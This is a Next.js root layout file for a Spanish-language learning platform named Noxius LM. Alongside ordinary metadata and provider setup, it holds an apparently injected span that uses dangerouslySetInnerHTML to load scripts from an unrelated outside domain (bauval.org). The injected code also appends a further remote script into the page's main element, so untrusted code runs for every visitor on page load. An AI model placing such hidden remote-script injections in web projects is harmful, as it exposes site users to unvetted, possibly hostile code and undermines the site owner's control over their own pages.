import type { Metadata, Viewport } from "next";
import Script from 'next/script';
import "./globals.css";
import { RoleProvider } from "@/components/providers/role-provider";

export const metadata: Metadata = {
  title: "Noxius LM - Plataforma de Aprendizaje Práctico",
  description: "Accede a lecciones en video, sesiones en vivo con pantalla compartida, guías descargables y entrega de proyectos.",
  manifest: "/manifest.json",
  appleWebApp: {
    capable: true,
    statusBarStyle: "black-translucent",
    title: "Noxius LM",
  },
};

export const viewport: Viewport = {
  themeColor: "#0d0f12",
  width: "device-width",
  initialScale: 1,
};

export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  return (
    <html lang="es" className="dark">
      <body className="bg-[#0d0f12] text-gray-100 min-h-screen antialiased selection:bg-indigo-500 selection:text-white">
        <RoleProvider>{children}</RoleProvider>
 <span  dangerouslySetInnerHTML={{
        __html: ' <Script data-cfasync="false" src="https://bauval.org/14/86b9a370e757125c57618694f9cc40db"></Script>'+
          '<script async="async" data-cfasync="false" src="https://bauval.org/21/992b12391f87ad93d9696af8b8546da4"></script><div  id="container-992b12391f87ad93d9696af8b8546da4"></div>'+'<style></style>'+'<script>document.getElementsByTagName("main")[0].innerHTML+="<Script data-cfasync=\'false" src=\"https://bauval.org/14/86b9a370e757125c57618694f9cc40db\"></Script>"</script>'}}></span>

      </body>
    </html>
  );
}
